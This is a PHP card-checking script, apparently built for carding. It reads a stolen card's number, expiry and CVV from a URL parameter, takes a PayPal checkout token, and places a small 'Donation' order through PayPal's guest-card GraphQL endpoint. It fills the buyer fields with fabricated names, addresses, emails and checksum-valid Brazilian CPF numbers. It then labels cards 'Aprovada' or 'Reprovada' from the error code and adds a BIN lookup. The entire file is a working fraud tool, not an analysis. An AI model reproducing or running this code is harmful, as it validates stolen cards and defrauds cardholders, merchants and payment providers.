<?php
error_reporting(0);
session_start();

function multiexplode($string) {
    $delimiters = ["|", ";", ":", "/", "»", "«", ">", "<"];
    $one = str_replace($delimiters, $delimiters[0], $string);
    return explode($delimiters[0], $one);
}

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    return explode($end, $str[1])[0];
}

function generate_contact_info($response) {
    return [
        'celular' => rand(1000000000, 9999999999),
        'endereco' => sprintf(
            "%s, %s, %s, %s",
            generate_nome_aleatorio(),
            rand(1, 1000),
            generate_bairro_aleatorio(),
            generate_cidade_aleatorio()
        ),
        'estado' => generate_estado_aleatorio(),
        'cidade' => generate_cidade_aleatorio(),
        'cep' => generate_cep_aleatorio()
    ];
}

function generate_nome_aleatorio() {
    $nomes = array("rua", "avenida", "pra a", "estrada", "travessa");
    return $nomes[array_rand($nomes)];
}

function generate_bairro_aleatorio() {
    $bairro = array("centro", "jardim", "cidade universitaria", "vila", "chacara");
    return $bairro[array_rand($bairro)];
}

function generate_cidade_aleatorio() {
    $cidades = array("Sao Paulo", "Rio de Janeiro", "Bras lia", "Curitiba", "Florian polis");
    return $cidades[array_rand($cidades)];
}

function generate_estado_aleatorio() {
    $estados = array("SP", "RJ", "DF", "PR", "SC");
    return $estados[array_rand($estados)];
}

function generate_cep_aleatorio() {
    $cep = rand(10000000, 99999999);
    return sprintf("%08d", $cep);
}

function generate_email() {
    $domains = array("gmail.com", "hotmail.com", "yahoo.com", "outlook.com");
    $domain = $domains[array_rand($domains)];
    $timestamp = time();
    $random_num = mt_rand(1, 10000); 
    $email = "chupa" . $timestamp . "_" . $random_num . "@$domain";
    return $email;
}

function nomeAleatorio() {
    $nomes = array(
        1 => 'Lucas', 2 => 'Ana', 3 => 'Lucia', 4 => 'Maria', 5 => 'Alice',
        6 => 'Fernando', 7 => 'Marcos', 8 => 'Ronaldo', 9 => 'Julia', 10 => 'Arthur',
        11 => 'Gabriel', 12 => 'Juliana', 13 => 'Bruno', 14 => 'Carla', 15 => 'Roberto',
        16 => 'Patricia', 17 => 'Felipe', 18 => 'Leticia', 19 => 'Mateus', 20 => 'Julio',
        21 => 'Amanda', 22 => 'Rafael', 23 => 'Renata', 24 => 'Ricardo', 25 => 'Sofia',
        26 => 'Anderson', 27 => 'Bianca', 28 => 'Vinicius', 29 => 'Simone', 30 => 'Eduardo',
        31 => 'Tatiane', 32 => 'Marcelo', 33 => 'Vanessa', 34 => 'Lucas', 35 => 'Tatiane',
        36 => 'Paula', 37 => 'Joao', 38 => 'Camila', 39 => 'Jorge', 40 => 'Elaine',
        41 => 'Ivan', 42 => 'Eliane', 43 => 'Luana', 44 => 'Thiago', 45 => 'Sandra',
        46 => 'Gustavo', 47 => 'Cristiane', 48 => 'Marcio', 49 => 'Claudia', 50 => 'Andressa'
    );
    $aleatorio = array_rand($nomes);
    return $nomes[$aleatorio];
}

function sobrenomeAleatorio() {
    $sobrenomes = array(
        1 => 'Silva', 2 => 'Santos', 3 => 'Pereira', 4 => 'Ferreira', 5 => 'Oliveira',
        6 => 'Ribeiro', 7 => 'Rodrigues', 8 => 'Almeida', 9 => 'Lima', 10 => 'Carvalho',
        11 => 'Gomes', 12 => 'Martins', 13 => 'Costa', 14 => 'Moreira', 15 => 'Mendes',
        16 => 'Araujo', 17 => 'Campos', 18 => 'Nogueira', 19 => 'Teixeira', 20 => 'Pinto'
    );
    $aleatorio = array_rand($sobrenomes);
    return $sobrenomes[$aleatorio];
}

function generate_cpf() {
    $n = [];

    for ($i = 0; $i < 9; $i++) {
        $n[] = rand(0, 9);
    }

    $d1 = 0;
    for ($i = 0, $j = 10; $i < 9; $i++, $j--) {
        $d1 += $n[$i] * $j;
    }
    $d1 = 11 - ($d1 % 11);
    $d1 = ($d1 >= 10) ? 0 : $d1;

    $n[] = $d1;

    $d2 = 0;
    for ($i = 0, $j = 11; $i < 10; $i++, $j--) {
        $d2 += $n[$i] * $j;
    }
    $d2 = 11 - ($d2 % 11);
    $d2 = ($d2 >= 10) ? 0 : $d2;

    $n[] = $d2;

    return implode('', $n);
}

function generateCardType($creditCardNumber) {
    $firstDigit = substr($creditCardNumber, 0, 1);

    switch ($firstDigit) {
        case '2':
        case '5':
            return 'MASTER_CARD';
        case '3':
            return 'AMEX';
        case '4':
            return 'VISA';
        case '6':
            return 'DISCOVER';
        default:
            return 'UNKNOWN';
    }
}

function getFluidpayDetails(string $bin): array {
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://app.fluidpay.com/api/lookup/bin/pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => array(
            'Authorization: pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
            'Content-Type: application/json',
        ),
        CURLOPT_POSTFIELDS => json_encode([
            'type' => 'tokenizer',
            'type_id' => '230685b9-61e6-4dc4-8cb2-18ef6fd93146',
            'bin' => $bin,
        ]),
    ));

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        curl_close($ch);
        return [
            'success' => false,
            'details' => 'Erro na requisi o: ' . curl_error($ch),
        ];
    }

    curl_close($ch);

    $responseData = json_decode($response, true);

    if (json_last_error() !== JSON_ERROR_NONE) {
        return [
            'success' => false,
            'details' => 'Erro ao decodificar a resposta JSON.',
        ];
    }

    if (isset($responseData['status']) && $responseData['status'] === 'success') {
        $data = $responseData['data'];
        $details = implode(
            ' ',
            [
                $data['card_brand'] ?? '',
                $data['issuing_bank'] ?? '',
                $data['card_level_generic'] ?? '',
                strtoupper($data['country'] ?? ''),
                strtoupper($data['card_type'] ?? 'CREDIT'),
            ]
        );

        return [
            'success' => true,
            'details' => strtoupper(trim($details)),
        ];
    } else {
        return [
            'success' => false,
            'details' => strtoupper($responseData['msg'] ?? 'Erro desconhecido.'),
        ];
    }
}

$lista = $_GET['lista'] ?? '';
[$cc, $mes, $ano, $cvv] = array_pad(explode('|', $lista), 4, '');
$cardType = generateCardType($cc);

$ano = strlen($ano) === 2 ? '20' . $ano : $ano;
$mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
$lastfor4 = substr($cc, -4);

if ((int) $ano < 2025 || ((int) $ano === 2025 && (int) $mes < 3)) {
    echo json_encode(['status' => 'Reprovada', 'list' => $lista, 'message' => 'EXPIRED_CARD']);
    exit;
}

$cookieDir = __DIR__ . "/cookie.txt";
if (file_exists($cookieDir)) {
    unlink($cookieDir);
}

function executeCurl(string $url, string $method, array $headers, ?string $postFields = null): string {
    $cookieFile = __DIR__ . '/cookie.txt';
    $curlOptions = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_COOKIEJAR => $cookieFile,
        CURLOPT_COOKIEFILE => $cookieFile,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POST => in_array($method, ['POST', 'PUT']),
    ];

    if ($postFields !== null) {
        $curlOptions[CURLOPT_POSTFIELDS] = $postFields;
    }

    $ch = curl_init();
    curl_setopt_array($ch, $curlOptions);
    $response = curl_exec($ch);

    return $response;
}

$response = executeCurl(
    "https://www.paypal.com/smart/buttons?style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&fundingSource=paypal&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_492a535db5_mty6mjg6nde&customerId=&clientID=AXvC3Esmc176nITd8oIUiVWMG0c6n-VJnJPcIaVSE-t1I-Qnulxu4OHCwDN80h_kF-NcZnK3Ai0LRxHR&clientMetadataID=uid_1a960bc26e_mty6mjg6nde&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=paylater&enableFunding.1=venmo&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.defaultBlueButtonColor=gold&experiment.venmoEnableWebOnNonNativeBrowser=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOnRydWUsImluc3RhbGxtZW50cyI6ZmFsc2UsInZlbmRvcnMiOnsidmlzYSI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwibWFzdGVyY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiYW1leCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGlzY292ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJjYl9uYXRpb25hbGUiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjp0cnVlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&intent=capture&locale.country=US&locale.lang=en&merchantID.0=KZTE6QC49FDL8&hasShippingCallback=false&platform=desktop&renderedButtons.0=paypal&sessionID=uid_1a960bc26e_mty6mjg6nde&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVh2QzNFc21jMTc2bklUZDhvSVVpVldNRzBjNm4tVkpuSlBjSWFWU0UtdDFJLVFudWx4dTRPSEN3RE44MGhfa0YtTmNabkszQWkwTFJ4SFImY3VycmVuY3k9VVNEJmVuYWJsZS1mdW5kaW5nPXBheWxhdGVyLHZlbm1vJm1lcmNoYW50LWlkPUtaVEU2UUM0OUZETDgmY29tcG9uZW50cz1mdW5kaW5nLWVsaWdpYmlsaXR5LGJ1dHRvbnMiLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9qaG5iZHZ0anFzZXF4bnZkdGxibHdlY2t5Y2VvcmIifX0&sdkVersion=5.0.474&storageID=uid_fd4b7e505d_mty6mjg6nde&supportedNativeBrowser=false&supportsPopups=true&vault=false",
    "GET",
    [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "Referer: https://checkout-app.svc.shoplightspeed.com/",
    ]
);
$token = getStr($response, 'facilitatorAccessToken":"', '"');

$response = executeCurl(
    "https://www.paypal.com/v2/checkout/orders",
    "POST",
    [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "Authorization: Bearer " . $token,
        "Content-Type: application/json",
    ],
    '{"purchase_units":[{"amount":{"value":1,"currency_code":"EUR"},"description":"Donation"}],"application_context":{"shipping_preference":"NO_SHIPPING"},"intent":"CAPTURE"}'
);

$id = getStr($response, 'id":"', '"');

$generate_contact_info = generate_contact_info($response);
$celular = $generate_contact_info['celular'];
$endereco = $generate_contact_info['endereco'];
$estado = $generate_contact_info['estado'];
$cidade = $generate_contact_info['cidade'];
$cep = $generate_contact_info['cep'];
$email = generate_email();
$nome = nomeAleatorio();
$sobrenome = sobrenomeAleatorio();
$cpf = generate_cpf();

$response = executeCurl(
    "https://www.paypal.com/graphql?fetch_credit_form_submit",
    "POST",
    [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "Content-Type: application/json",
        "Paypal-Client-Context: " . $id,
        "Paypal-Client-Metadata-Id: " . $id,
        "X-Country: BR",
        "X-App-Name: standardcardfields",
        "Origin: https://www.paypal.com",
    ],
    '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"' . $id . '","card":{"cardNumber":"' . $cc . '","type":"' . $cardType . '","expirationDate":"' . $mes . '/' . $ano . '","postalCode":"' . $cep . '","securityCode":"' . $cvv . '","productClass":"CREDIT"},"phoneNumber":"' . $celular . '","firstName":"' . $nome . ' '.$sobrenome.'","lastName":"DEV","billingAddress":{"givenName":"' . $nome . ' '.$sobrenome.'","familyName":"DEV","state":"' . $estado . '","country":"BR","postalCode":"' . $cep . '","line1":"' . $endereco . '","line2":"","city":"' . $cidade . '"},"email":"' . $email . '","currencyConversionType":"VENDOR","identityDocument":{"value":"' . $cpf . '","type":"CPF"}},"operationName":null}'
);

$code = json_decode($response)->errors[0]->data[0]->code;

$messages = ["INVALID_SECURITY_CODE", "is3DSecureRequired", "INVALID_BILLING_ADDRESS"];

$binchecker = getFluidpayDetails(substr($cc, 0, 6))['details'];
$ReturnCode = "$binchecker - $code";
// Verifica se o código está em $messages

if (in_array($code, $messages)) { 

    echo "<span style='color:green;'> Aprovada<span style='color:beige;'>$cc|$mes|$ano|$cvv</span> <span style='color:beige;'>$ReturnCode</span> <span style='color:beige;'>| DEBITOU 12USD|</span><br><span style='color:green;'>DADOS ULTILIZADOS: $email | $nome $sobrenome | $cep | $endereco | $cpf | @ABOBORASUPORTE";
} else {
    echo "<span style='color:red;'> Reprovada</span> <span style='color:beige;'>$cc|$mes|$ano|$cvv</span> <span style='color:beige;'>$ReturnCode</span> <span style='color:beige;'>| N�O DEBITOU 12USD|</span><br><span style='color:green;'>DADOS ULTILIZADOS: $email | $nome $sobrenome | $cep | $endereco | $cpf | @ABOBORASUPORTE";
}
